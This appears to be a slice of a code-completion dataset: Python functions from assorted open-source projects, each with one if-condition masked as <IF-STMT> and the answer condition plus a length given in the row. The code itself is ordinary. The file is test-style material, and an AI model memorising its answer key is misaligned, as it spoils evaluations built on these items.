581,"def _get_py_flags(self):<tab>res = dict(self.flags)<tab>cflags = res.pop(""cflags"", """")<tab>for fl in cflags.split(""|""):<tab><tab>fl = fl.strip()<tab><tab>if fl == ""GA_USE_DOUBLE"":<tab><tab><tab>res[""have_double""] = True<tab><tab>if fl == ""GA_USE_SMALL"":<tab><tab><tab>res[""have_small""] = True<tab><tab><IF-STMT><tab><tab><tab>res[""have_complex""] = True<tab><tab>if fl == ""GA_USE_HALF"":<tab><tab><tab>res[""have_half""] = True<tab>return res","if fl == ""GA_USE_COMPLEX"" :",160
582,"def populate(self):<tab>classes = self.applet.Plugins.get_classes()<tab>loaded = self.applet.Plugins.get_loaded()<tab>for name, cls in classes.items():<tab><tab><IF-STMT><tab><tab><tab>desc = '<span weight=""bold"">%s</span>' % name<tab><tab>else:<tab><tab><tab>desc = name<tab><tab>self.list.append(<tab><tab><tab>active=(name in loaded),<tab><tab><tab>icon=cls.__icon__,<tab><tab><tab>activatable=cls.__unloadable__,<tab><tab><tab>name=name,<tab><tab><tab>desc=desc,<tab><tab>)",if cls . is_configurable ( ) :,149
583,"def visit_decorator(self, o: Decorator) -> None:<tab>if self.is_private_name(o.func.name, o.func.fullname):<tab><tab>return<tab>is_abstract = False<tab>for decorator in o.original_decorators:<tab><tab>if isinstance(decorator, NameExpr):<tab><tab><tab>if self.process_name_expr_decorator(decorator, o):<tab><tab><tab><tab>is_abstract = True<tab><tab><IF-STMT><tab><tab><tab>if self.process_member_expr_decorator(decorator, o):<tab><tab><tab><tab>is_abstract = True<tab>self.visit_func_def(o.func, is_abstract=is_abstract)","elif isinstance ( decorator , MemberExpr ) :",160
584,"def hint(self, button):<tab>""""""As hilight, but marks GTK Button as well""""""<tab>active = None<tab>for b in self.button_widgets.values():<tab><tab><IF-STMT><tab><tab><tab>b.widget.set_state(Gtk.StateType.NORMAL)<tab><tab><tab>if b.name == button:<tab><tab><tab><tab>active = b.widget<tab>if active is not None:<tab><tab>active.set_state(Gtk.StateType.ACTIVE)<tab>self.hilight(button)",if b . widget . get_sensitive ( ) :,126
585,"def read_message_py2(self):<tab>chunks = []<tab>while True:<tab><tab>hi, lo = self.wire.read(2)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>size = hi << 8 | lo<tab><tab>chunks.append(self.wire.read(size))<tab>message = bytearray(b"""".join(map(bytes, chunks)))<tab>_, n = divmod(message[0], 0x10)<tab>unpacker = UnpackStream(message, offset=2)<tab>fields = [unpacker.unpack() for _ in range(n)]<tab>return message[1], fields",if hi == lo == 0 :,148
586,"def offsetToRva(self, offset):<tab>if self.inmem:<tab><tab>return offset<tab>for s in self.sections:<tab><tab>sbase = s.PointerToRawData<tab><tab>if s.SizeOfRawData + s.PointerToRawData > self.getMaxRva():<tab><tab><tab># SizeOfRawData can be misleading.<tab><tab><tab>ssize = s.VirtualSize<tab><tab>else:<tab><tab><tab>ssize = max(s.SizeOfRawData, s.VirtualSize)<tab><tab><IF-STMT><tab><tab><tab>return offset - s.PointerToRawData + s.VirtualAddress<tab>return 0",if sbase <= offset and offset < sbase + ssize :,155
587,"def highlight_from_dir(self, workspace_dir):<tab>while True:<tab><tab>for f in os.listdir(workspace_dir):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.process_trace(os.path.join(workspace_dir, f))<tab><tab>if not self.live_update:<tab><tab><tab>break<tab><tab>time.sleep(interval)","if f . endswith ( ""trace"" ) :",92
588,"def check_tokenize(self, s, expected):<tab># Format the tokens in s in a table format.<tab># The ENDMARKER is omitted.<tab>result = []<tab>f = StringIO(s)<tab>for type, token, start, end, line in generate_tokens(f.readline):<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>type = tok_name[type]<tab><tab>result.append(""<tab>%(type)-10.10s %(token)-13.13r %(start)s %(end)s"" % locals())<tab>self.assertEqual(result, expected.rstrip().splitlines())",if type == ENDMARKER :,143
589,"def enable(self):<tab>""""""enable the patch.""""""<tab>for patch in self.dependencies:<tab><tab>patch.enable()<tab>if not self.enabled:<tab><tab>pyv = sys.version_info[0]<tab><tab>if pyv == 2:<tab><tab><tab>if self.PY2 == SKIP:<tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab>if not self.PY2:<tab><tab><tab><tab>raise IncompatiblePatch(""Python 2 not supported!"")<tab><tab><IF-STMT><tab><tab><tab>if self.PY3 == SKIP:<tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab>if not self.PY3:<tab><tab><tab><tab>raise IncompatiblePatch(""Python 3 not supported!"")<tab><tab>self.pre_enable()<tab><tab>self.do_enable()<tab><tab>self.enabled = True",if pyv == 3 :,191
590,"def __xor__(self, other):<tab>inc, exc = _norm_args_notimplemented(other)<tab>if inc is NotImplemented:<tab><tab>return NotImplemented<tab>if inc is NotImplemented:<tab><tab>return NotImplemented<tab>if self._included is None:<tab><tab>if exc is None:  # - +<tab><tab><tab>return _ComplementSet(excluded=self._excluded - inc)<tab><tab>else:  # - -<tab><tab><tab>return _ComplementSet(included=self._excluded.symmetric_difference(exc))<tab>else:<tab><tab><IF-STMT>  # + -<tab><tab><tab>return _ComplementSet(excluded=exc - self._included)<tab><tab>else:  # + +<tab><tab><tab>return _ComplementSet(included=self._included.symmetric_difference(inc))",if inc is None :,183
591,"def update_defaults(self, *values, **kwargs):<tab>for value in values:<tab><tab>if type(value) == dict:<tab><tab><tab>self.DEFAULT_CONFIGURATION.update(value)<tab><tab>elif isinstance(value, types.ModuleType):<tab><tab><tab>self.__defaults_from_module(value)<tab><tab><IF-STMT><tab><tab><tab>if os.path.exists(value):<tab><tab><tab><tab>self.__defaults_from_file(value)<tab><tab><tab>else:<tab><tab><tab><tab>logger.warning(""Configuration file {} does not exist."".format(value))<tab><tab>elif isinstance(value, type(None)):<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>raise ValueError(""Cannot interpret {}"".format(value))<tab>self.DEFAULT_CONFIGURATION.update(kwargs)","elif isinstance ( value , str ) :",184
592,"def maybe_add_0000_to_all_niigz(folder):<tab>nii_gz = subfiles(folder, suffix="".nii.gz"")<tab>for n in nii_gz:<tab><tab>n = remove_trailing_slash(n)<tab><tab><IF-STMT><tab><tab><tab>os.rename(n, n[:-7] + ""_0000.nii.gz"")","if not n . endswith ( ""_0000.nii.gz"" ) :",99
593,"def newstart(self):<tab>newstartdatetime = self._newstartdate<tab>if not self.checkallday.state:<tab><tab><IF-STMT><tab><tab><tab>tzinfo = self.conf.default.default_timezone<tab><tab>else:<tab><tab><tab>tzinfo = self.startdt.tzinfo<tab><tab>try:<tab><tab><tab>newstarttime = self._newstarttime<tab><tab><tab>newstartdatetime = datetime.combine(newstartdatetime, newstarttime)<tab><tab><tab>newstartdatetime = tzinfo.localize(newstartdatetime)<tab><tab>except TypeError:<tab><tab><tab>return None<tab>return newstartdatetime","if not hasattr ( self . startdt , ""tzinfo"" ) or self . startdt . tzinfo is None :",156
594,"def _fetch_all_channels(self, force=False):<tab>""""""Fetch all channel feeds from cache or network.""""""<tab>channels = self._get_channel_configs(force=force)<tab>enabled = self._settings.get([""enabled_channels""])<tab>forced = self._settings.get([""forced_channels""])<tab>all_channels = {}<tab>for key, config in channels.items():<tab><tab>if key not in enabled and key not in forced:<tab><tab><tab>continue<tab><tab>if ""url"" not in config:<tab><tab><tab>continue<tab><tab>data = self._get_channel_data(key, config, force=force)<tab><tab><IF-STMT><tab><tab><tab>all_channels[key] = data<tab>return all_channels",if data is not None :,174
595,"def _setup_graph(self):<tab>vars = tf.trainable_variables()<tab>ops = []<tab>for v in vars:<tab><tab>n = v.op.name<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>logger.info(""Clip {}"".format(n))<tab><tab>ops.append(tf.assign(v, tf.clip_by_value(v, -0.01, 0.01)))<tab>self._op = tf.group(*ops, name=""clip"")","if not n . startswith ( ""discrim/"" ) :",120
596,"def on_window_state_event(self, widget, event):<tab>if event.changed_mask & WindowState.ICONIFIED:<tab><tab><IF-STMT><tab><tab><tab>log.debug(""MainWindow is minimized.."")<tab><tab><tab>component.get(""TorrentView"").save_state()<tab><tab><tab>component.pause(self.child_components)<tab><tab><tab>self.is_minimized = True<tab><tab>else:<tab><tab><tab>log.debug(""MainWindow is not minimized.."")<tab><tab><tab>component.resume(self.child_components)<tab><tab><tab>self.is_minimized = False<tab>return False",if event . new_window_state & WindowState . ICONIFIED :,160
597,"def getJsonData(self, url, decode_from=None, **kwargs):<tab>cache_key = md5(url)<tab>data = self.getCache(cache_key, url, **kwargs)<tab>if data:<tab><tab>try:<tab><tab><tab>data = data.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data = data.decode(decode_from)<tab><tab><tab>return json.loads(data)<tab><tab>except:<tab><tab><tab>log.error(<tab><tab><tab><tab>""Failed to parsing %s: %s"", (self.getName(), traceback.format_exc())<tab><tab><tab>)<tab>return []",if decode_from :,152
598,"def init_weights(self):<tab>for n, p in self.named_parameters():<tab><tab>if ""bias"" in n:<tab><tab><tab>torch.nn.init.zeros_(p)<tab><tab><IF-STMT><tab><tab><tab>torch.nn.init.xavier_uniform_(p)","elif ""fc"" in n :",71
599,"def get_file_language(filename, text=None):<tab>""""""Get file language from filename""""""<tab>ext = osp.splitext(filename)[1]<tab>if ext.startswith("".""):<tab><tab>ext = ext[1:]  # file extension with leading dot<tab>language = ext<tab>if not ext:<tab><tab><IF-STMT><tab><tab><tab>text, _enc = encoding.read(filename)<tab><tab>for line in text.splitlines():<tab><tab><tab>if not line.strip():<tab><tab><tab><tab>continue<tab><tab><tab>if line.startswith(""#!""):<tab><tab><tab><tab>shebang = line[2:]<tab><tab><tab><tab>if ""python"" in shebang:<tab><tab><tab><tab><tab>language = ""python""<tab><tab><tab>else:<tab><tab><tab><tab>break<tab>return language",if text is None :,183
600,"def readwrite(obj, flags):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>obj.handle_read_event()<tab><tab>if flags & select.POLLOUT:<tab><tab><tab>obj.handle_write_event()<tab><tab>if flags & select.POLLPRI:<tab><tab><tab>obj.handle_expt_event()<tab><tab>if flags & (select.POLLHUP | select.POLLERR | select.POLLNVAL):<tab><tab><tab>obj.handle_close()<tab>except OSError as e:<tab><tab>if e.args[0] not in _DISCONNECTED:<tab><tab><tab>obj.handle_error()<tab><tab>else:<tab><tab><tab>obj.handle_close()<tab>except _reraised_exceptions:<tab><tab>raise<tab>except:<tab><tab>obj.handle_error()",if flags & select . POLLIN :,192
601,"def sortPlaces(self, newColumn, newOrder, force=False):<tab>profile_id = self.config.currentProfile()<tab>if newColumn == 0 and newOrder == Qt.AscendingOrder:<tab><tab><IF-STMT><tab><tab><tab>newColumn, newOrder = 1, Qt.AscendingOrder<tab><tab><tab>self.places.header().setSortIndicator(newColumn, newOrder)<tab><tab><tab>self.placesSortLoop[profile_id] = False<tab><tab>else:<tab><tab><tab>self.placesSortLoop[profile_id] = True<tab>self.updatePlaces()",if profile_id in self . placesSortLoop and self . placesSortLoop [ profile_id ] :,158
602,def _result_iter(self):<tab>pos = 0<tab>while 1:<tab><tab>upper = len(self._result_cache)<tab><tab>while pos < upper:<tab><tab><tab>yield self._result_cache[pos]<tab><tab><tab>pos = pos + 1<tab><tab>if not self._iter:<tab><tab><tab>raise StopIteration<tab><tab><IF-STMT><tab><tab><tab>self._fill_cache(),if len ( self . _result_cache ) <= pos :,102
603,"def get_field_type(self, name):<tab>fkey = (name, self.dummy)<tab>target = None<tab>op, name = name.split(""_"", 1)<tab>if op in {""delete"", ""insert"", ""update""}:<tab><tab>target = super().get_field_type(name)<tab><tab><IF-STMT><tab><tab><tab>module, edb_name = self.get_module_and_name(name)<tab><tab><tab>target = self.edb_schema.get((module, edb_name), None)<tab><tab><tab>if target is not None:<tab><tab><tab><tab>target = self.convert_edb_to_gql_type(target)<tab>self._fields[fkey] = target<tab>return target",if target is None :,170
604,"def _transaction(self, args=None):<tab>cmd = args[0] if args else None<tab>if cmd == ""reset"":<tab><tab>self._clean()<tab><tab>return<tab>self._resolve()<tab>if cmd in [""list"", None]:<tab><tab><IF-STMT><tab><tab><tab>out = self.base.output.list_transaction(self.base._transaction)<tab><tab><tab>logger.info(out)<tab>elif cmd == ""run"":<tab><tab>try:<tab><tab><tab>self.base.do_transaction()<tab><tab>except dnf.exceptions.Error as e:<tab><tab><tab>logger.error(_(""Error:"") + "" "" + ucd(e))<tab><tab>else:<tab><tab><tab>logger.info(_(""Complete!""))<tab><tab>self._clean()<tab>else:<tab><tab>self._help(""transaction"")",if self . base . _transaction :,191
605,"def _gather_crash_info(self):<tab>super()._gather_crash_info()<tab>self._crash_info += [<tab><tab>(""Commandline args"", "" "".join(sys.argv[1:])),<tab><tab>(""Open Pages"", ""\n\n"".join(""\n"".join(e) for e in self._pages)),<tab><tab>(""Command history"", ""\n"".join(self._cmdhist)),<tab><tab>(""Objects"", self._qobjects),<tab>]<tab>try:<tab><tab>text = ""Log output was disabled.""<tab><tab><IF-STMT><tab><tab><tab>text = log.ram_handler.dump_log()<tab><tab>self._crash_info.append((""Debug log"", text))<tab>except Exception:<tab><tab>self._crash_info.append((""Debug log"", traceback.format_exc()))",if log . ram_handler is not None :,192
606,"def classifyws(s, tabwidth):<tab>raw = effective = 0<tab>for ch in s:<tab><tab>if ch == "" "":<tab><tab><tab>raw = raw + 1<tab><tab><tab>effective = effective + 1<tab><tab><IF-STMT><tab><tab><tab>raw = raw + 1<tab><tab><tab>effective = (effective // tabwidth + 1) * tabwidth<tab><tab>else:<tab><tab><tab>break<tab>return raw, effective","elif ch == ""\t"" :",101
607,"def process(self, node):<tab>self.vars = []<tab>for child in node.childNodes:<tab><tab><IF-STMT><tab><tab><tab>child_text = get_xml_text(child)<tab><tab><tab>if child_text == """":  # pragma:nocover<tab><tab><tab><tab>continue<tab><tab><tab>if child.nodeName == ""Real"":<tab><tab><tab><tab>for val in re.split(""[\t ]+"", child_text):<tab><tab><tab><tab><tab>self.vars.append(1.0 * eval(val))<tab>return self",if child . nodeType == node . ELEMENT_NODE :,135
608,"def _format_privilege_data(self, data):<tab>for key in [""spcacl""]:<tab><tab><IF-STMT><tab><tab><tab>if ""added"" in data[key]:<tab><tab><tab><tab>data[key][""added""] = parse_priv_to_db(data[key][""added""], self.acl)<tab><tab><tab>if ""changed"" in data[key]:<tab><tab><tab><tab>data[key][""changed""] = parse_priv_to_db(data[key][""changed""], self.acl)<tab><tab><tab>if ""deleted"" in data[key]:<tab><tab><tab><tab>data[key][""deleted""] = parse_priv_to_db(data[key][""deleted""], self.acl)",if key in data and data [ key ] is not None :,168
609,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_application_key(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_message(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 26:<tab><tab><tab>self.set_tag(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,152
610,"def test_cat(shape, cat_dim, split, dim):<tab>assert sum(split) == shape[cat_dim]<tab>gaussian = random_gaussian(shape, dim)<tab>parts = []<tab>end = 0<tab>for size in split:<tab><tab>beg, end = end, end + size<tab><tab>if cat_dim == -1:<tab><tab><tab>part = gaussian[..., beg:end]<tab><tab><IF-STMT><tab><tab><tab>part = gaussian[..., beg:end, :]<tab><tab>elif cat_dim == 1:<tab><tab><tab>part = gaussian[:, beg:end]<tab><tab>else:<tab><tab><tab>raise ValueError<tab><tab>parts.append(part)<tab>actual = Gaussian.cat(parts, cat_dim)<tab>assert_close_gaussian(actual, gaussian)",elif cat_dim == - 2 :,186
611,"def __conform__(self, interface, registry=None, default=None):<tab>for providedInterface in self.provided:<tab><tab><IF-STMT><tab><tab><tab>return self.load()<tab><tab>if getAdapterFactory(providedInterface, interface, None) is not None:<tab><tab><tab>return interface(self.load(), default)<tab>return default",if providedInterface . isOrExtends ( interface ) :,87
612,"def __init__(self, oid):<tab>self.oid = oid<tab>self.cmpt = []<tab>fmt = []<tab>for i in oid.split("".""):<tab><tab><IF-STMT><tab><tab><tab>fmt.append(""%i"")<tab><tab><tab>self.cmpt.append(tuple(map(int, i.split(""-""))))<tab><tab>else:<tab><tab><tab>fmt.append(i)<tab>self.fmt = ""."".join(fmt)","if ""-"" in i :",104
613,"def build_CallFunc(self, o):<tab>children = o.getChildren()<tab># Build callee from first child<tab>callee = self.build(children[0])<tab># Build args and kwargs from remaining children<tab>args = []<tab>kwargs = {}<tab>for child in children[1:]:<tab><tab>class_name = child.__class__.__name__<tab><tab># None is ignored<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab># Keywords become kwargs<tab><tab>if class_name == ""Keyword"":<tab><tab><tab>kwargs.update(self.build(child))<tab><tab># Everything else becomes args<tab><tab>else:<tab><tab><tab>args.append(self.build(child))<tab>return callee(*args, **kwargs)","if class_name == ""NoneType"" :",175
614,"def format_raises(self, e, *args, **kw):<tab>self.startTest()<tab>try:<tab><tab>args[0].format(*args[1:], **kw)<tab>except e:<tab><tab>return True<tab>else:<tab><tab><IF-STMT><tab><tab><tab>excName = e.__name__<tab><tab>else:<tab><tab><tab>excName = str(e)<tab><tab>self.fail(""%s not raised"" % excName)<tab>return False","if hasattr ( e , ""__name__"" ) :",114
615,"def make_record_paths_absolute(self, record_dict):<tab># make paths absolute<tab>d = {}<tab>for k, v in record_dict.items():<tab><tab><IF-STMT>  # filename<tab><tab><tab>if ""."" in v:<tab><tab><tab><tab>v = os.path.join(self.path, v)<tab><tab>d[k] = v<tab>return d",if type ( v ) == str :,95
616,"def work(self):<tab>while self.active:<tab><tab>stat = os.stat(self.filename)<tab><tab><IF-STMT><tab><tab><tab>self.callback(self.last_stat, stat)<tab><tab>self.last_stat = stat<tab><tab>time.sleep(self.interval)",if self . last_stat is not None and self . last_stat != stat :,84
617,"def try_append_extension(self, path):<tab>append_setting = self.get_append_extension_setting()<tab>if self.settings.get(append_setting, False):<tab><tab>if not self.is_copy_original_name(path):<tab><tab><tab>_, new_path_extension = os.path.splitext(path)<tab><tab><tab>if new_path_extension == """":<tab><tab><tab><tab>argument_name = self.get_argument_name()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>_, extension = os.path.splitext(self.view.file_name())<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>_, extension = os.path.splitext(argument_name)<tab><tab><tab><tab>path += extension<tab>return path",if argument_name is None :,181
618,"def _out_of_date(rw_file):<tab>""""""Check if a run workflow file points to an older version of manta and needs a refresh.""""""<tab>with open(rw_file) as in_handle:<tab><tab>for line in in_handle:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>file_version = line.split(""/lib/python"")[0].split(""Cellar/manta/"")[-1]<tab><tab><tab><tab>if file_version != programs.get_version_manifest(""manta""):<tab><tab><tab><tab><tab>return True<tab>return False","if line . startswith ( ""sys.path.append"" ) :",137
619,"def test_model_inference():<tab>x = torch.rand(1, 3, 224, 224)<tab>for model_name in encoding.models.pretrained_model_list():<tab><tab>print(""Doing: "", model_name)<tab><tab><IF-STMT><tab><tab><tab>continue  # need multi-gpu<tab><tab>model = encoding.models.get_model(model_name, pretrained=True)<tab><tab>model.eval()<tab><tab>y = model(x)","if ""wideresnet"" in model_name :",115
620,"def _process_frame(self, frame_num, frame_im, callback=None):<tab># type(int, numpy.ndarray) -> None<tab>""""""Adds any cuts detected with the current frame to the cutting list.""""""<tab>for detector in self._detector_list:<tab><tab>cuts = detector.process_frame(frame_num, frame_im)<tab><tab><IF-STMT><tab><tab><tab>callback(frame_im, frame_num)<tab><tab>self._cutting_list += cuts<tab>for detector in self._sparse_detector_list:<tab><tab>events = detector.process_frame(frame_num, frame_im)<tab><tab>if events and callback:<tab><tab><tab>callback(frame_im, frame_num)<tab><tab>self._event_list += events",if cuts and callback :,178
621,"def __saveWork(self, work, results):<tab>""""""Stores the resulting last log line to the cache with the proxy key""""""<tab>del work<tab># pylint: disable=broad-except<tab>try:<tab><tab><IF-STMT><tab><tab><tab>__cached = self.__cache[results[0]]<tab><tab><tab>__cached[self.__TIME] = time.time()<tab><tab><tab>__cached[self.__ETA] = results[1]<tab>except KeyError as e:<tab><tab># Could happen while switching jobs with work in the queue<tab><tab>pass<tab>except Exception as e:<tab><tab>list(map(logger.warning, cuegui.Utils.exceptionOutput(e)))",if results :,154
622,"def _on_preference_changed(self, client, timestamp, entry, extra):<tab>attr = entry.key[entry.key.rindex(""/"") + 1 :]<tab>try:<tab><tab>valuestruct = self._prefs[attr]<tab>except KeyError:  # unknown key, we don't care about it<tab><tab>pass<tab>else:<tab><tab><IF-STMT>  # value has changed<tab><tab><tab>newval = getattr(entry.value, ""get_%s"" % valuestruct.type)()<tab><tab><tab>setattr(self, attr, newval)<tab><tab>else:  # value has been deleted<tab><tab><tab>setattr(self, attr, valuestruct.default)",if entry . value != None :,153
623,"def open(self, url, new=0, autoraise=1):<tab>cmdline = [self.name] + [arg.replace(""%s"", url) for arg in self.args]<tab>try:<tab><tab><IF-STMT><tab><tab><tab>p = subprocess.Popen(cmdline)<tab><tab>else:<tab><tab><tab>setsid = getattr(os, ""setsid"", None)<tab><tab><tab>if not setsid:<tab><tab><tab><tab>setsid = getattr(os, ""setpgrp"", None)<tab><tab><tab>p = subprocess.Popen(cmdline, close_fds=True, preexec_fn=setsid)<tab><tab>return p.poll() is None<tab>except OSError:<tab><tab>return False","if sys . platform [ : 3 ] == ""win"" :",170
624,"def get_ofs(self, dp_id):<tab>if len(self) == 0:<tab><tab>raise ValueError(""qos sw is not connected."")<tab>dps = {}<tab>if dp_id == REST_ALL:<tab><tab>dps = self<tab>else:<tab><tab>try:<tab><tab><tab>dpid = dpid_lib.str_to_dpid(dp_id)<tab><tab>except:<tab><tab><tab>raise ValueError(""Invalid switchID."")<tab><tab><IF-STMT><tab><tab><tab>dps = {dpid: self[dpid]}<tab><tab>else:<tab><tab><tab>msg = ""qos sw is not connected. : switchID=%s"" % dp_id<tab><tab><tab>raise ValueError(msg)<tab>return dps",if dpid in self :,173
625,"def __init__(self, context, keymap={}):<tab>if not ActionHandler._actions:<tab><tab>ActionHandler._actions = Actions.get_instance(context)<tab>_keymap = {}<tab>for (k, v) in keymap.items():<tab><tab><IF-STMT><tab><tab><tab>v = {v}<tab><tab>_keymap[k] = {op for action in v for op in translate_blenderop(action)}<tab>self.__dict__[""_keymap""] = _keymap",if type ( v ) is not set and type ( v ) is not list :,125
626,"def setCounter(self, i):<tab>if 0 == i:<tab><tab><IF-STMT><tab><tab><tab>self.setIcon(QtGui.QIcon.fromTheme(""scudcloud-attention""))<tab><tab>else:<tab><tab><tab>self.setIcon(QtGui.QIcon.fromTheme(""scudcloud""))<tab>elif i > 0 and i < 10:<tab><tab>self.setIcon(QtGui.QIcon.fromTheme(""scudcloud-attention-"" + str(int(i))))<tab>elif i > 9:<tab><tab>self.setIcon(QtGui.QIcon.fromTheme(""scudcloud-attention-9-plus""))",if True == self . urgent :,146
627,"def consume_bytes(data):<tab>state_machine.receive_data(data)<tab>while True:<tab><tab>event = state_machine.next_event()<tab><tab>if event is h11.NEED_DATA:<tab><tab><tab>break<tab><tab>elif isinstance(event, h11.InformationalResponse):<tab><tab><tab># Ignore 1xx responses<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab># We have our response! Save it and get out of here.<tab><tab><tab>context[""h11_response""] = event<tab><tab><tab>raise LoopAbort<tab><tab>else:<tab><tab><tab># Can't happen<tab><tab><tab>raise RuntimeError(""Unexpected h11 event {}"".format(event))","elif isinstance ( event , h11 . Response ) :",166
628,"def _evoke_request(cls):<tab>succeed = False<tab>with cls.LOCK:<tab><tab><IF-STMT><tab><tab><tab>resource, request_semaphore = cls.REQUESTING_STACK.pop()<tab><tab><tab>node = cls.check_availability(resource)<tab><tab><tab>if node is not None:<tab><tab><tab><tab>cls.NODE_RESOURCE_MANAGER[node]._request(node, resource)<tab><tab><tab><tab>logger.debug(""\nEvoking requesting resource {}"".format(resource))<tab><tab><tab><tab>request_semaphore.release()<tab><tab><tab><tab>succeed = True<tab><tab><tab>else:<tab><tab><tab><tab>cls.REQUESTING_STACK.append((resource, request_semaphore))<tab><tab><tab><tab>return<tab>if succeed:<tab><tab>cls._evoke_request()",if len ( cls . REQUESTING_STACK ) > 0 :,188
629,"def _get_related_field(self, field):<tab>model_class = self.Meta.model<tab>try:<tab><tab>related_field = model_class._meta.get_field(field.source)<tab>except FieldDoesNotExist:<tab><tab># If `related_name` is not set, field name does not include<tab><tab># `_set` -> remove it and check again<tab><tab>default_postfix = ""_set""<tab><tab><IF-STMT><tab><tab><tab>related_field = model_class._meta.get_field(<tab><tab><tab><tab>field.source[: -len(default_postfix)]<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>raise<tab>if isinstance(related_field, ForeignObjectRel):<tab><tab>return related_field.field, False<tab>return related_field, True",if field . source . endswith ( default_postfix ) :,189
630,"def find_best_layout_for_subplots(num_subplots):<tab>r, c = 1, 1<tab>while (r * c) < num_subplots:<tab><tab><IF-STMT><tab><tab><tab>c += 1<tab><tab>elif c == (r + 2):<tab><tab><tab>r += 1<tab><tab><tab>c -= 1<tab>return r, c",if ( c == ( r + 1 ) ) or ( r == c ) :,94
631,"def __repr__(self):<tab>attrs = {}<tab>for name, _ in self:<tab><tab>try:<tab><tab><tab>attr = getattr(self, name)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>attrs[name] = repr(attr)<tab><tab>except ValidationError:<tab><tab><tab>pass<tab>return ""{class_name}({fields})"".format(<tab><tab>class_name=self.__class__.__name__,<tab><tab>fields="", "".join(""{0[0]}={0[1]}"".format(x) for x in sorted(attrs.items())),<tab>)",if attr is not None :,132
632,"def findsection(self, key):<tab>to_return = copy.deepcopy(self)<tab>for subsection in to_return:<tab><tab>try:<tab><tab><tab>value = list(ConfigObj.find_key(to_return[subsection], key))[0]<tab><tab>except Exception:<tab><tab><tab>value = None<tab><tab><IF-STMT><tab><tab><tab>del to_return[subsection]<tab><tab>else:<tab><tab><tab>for category in to_return[subsection]:<tab><tab><tab><tab>if category != key:<tab><tab><tab><tab><tab>del to_return[subsection][category]<tab># cleanout empty sections and subsections<tab>for key in [k for (k, v) in to_return.items() if not v]:<tab><tab>del to_return[key]<tab>return to_return",if not value :,189
633,"def _get_streams(self, url, video_id, app_id_ver):<tab># Sometimes the return dict does not have 'stream'<tab>for trial_count in range(3):<tab><tab>stream_info = self._get_stream_info(<tab><tab><tab>url,<tab><tab><tab>video_id,<tab><tab><tab>app_id_ver,<tab><tab><tab>extra_note="" (try %d)"" % (trial_count + 1) if trial_count > 0 else """",<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return stream_info[0][""args""][0][""stream""]<tab>return []","if ""stream"" in stream_info [ 0 ] [ ""args"" ] [ 0 ] :",156
634,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 8:<tab><tab><tab>self.set_format(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_path(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,120
635,"def summary(self):<tab>""""""Return a string with a pretty-printed summary for the company.""""""<tab>if not self:<tab><tab>return u""""<tab>s = u""Company\n=======\nName: %s\n"" % self.get(""name"", u"""")<tab>for k in (<tab><tab>""distributor"",<tab><tab>""production company"",<tab><tab>""miscellaneous company"",<tab><tab>""special effects company"",<tab>):<tab><tab>d = self.get(k, [])[:5]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>s += u""Last movies from this company (%s): %s.\n"" % (<tab><tab><tab>k,<tab><tab><tab>u""; "".join([x.get(""long imdb title"", u"""") for x in d]),<tab><tab>)<tab>return s",if not d :,190
636,"def __call__(self, data):<tab>keys = set(data.keys)<tab>for attr_name in self._attr_names:<tab><tab><IF-STMT><tab><tab><tab>raise Exception(<tab><tab><tab><tab>""attr_name: {} isn t within keys: {}"".format(attr_name, keys)<tab><tab><tab>)<tab>for attr_name in self._attr_names:<tab><tab>delattr(data, attr_name)<tab>return data",if attr_name not in keys and self . _strict :,112
637,"def _count(self, element, count=True):<tab>if not isinstance(element, six.string_types):<tab><tab>if self == element:<tab><tab><tab>return 1<tab>i = 0<tab>for child in self.children:<tab><tab># child is text content and element is also text content, then<tab><tab># make a simple ""text"" in ""text""<tab><tab>if isinstance(child, six.string_types):<tab><tab><tab>if isinstance(element, six.string_types):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>i += child.count(element)<tab><tab><tab><tab>elif element in child:<tab><tab><tab><tab><tab>return 1<tab><tab>else:<tab><tab><tab>i += child._count(element, count=count)<tab><tab><tab>if not count and i:<tab><tab><tab><tab>return i<tab>return i",if count :,196
638,"def produce_etag_headers(self, filename):<tab>""""""Produce a dict of curl headers containing etag headers from the download.""""""<tab>headers = {}<tab># If the download file already exists, add some headers to the request<tab># so we don't retrieve the content if it hasn't changed<tab>if os.path.exists(filename):<tab><tab>self.existing_file_size = os.path.getsize(filename)<tab><tab>etag = self.getxattr(self.xattr_etag)<tab><tab>last_modified = self.getxattr(self.xattr_last_modified)<tab><tab>if etag:<tab><tab><tab>headers[""If-None-Match""] = etag<tab><tab><IF-STMT><tab><tab><tab>headers[""If-Modified-Since""] = last_modified<tab>return headers",if last_modified :,182
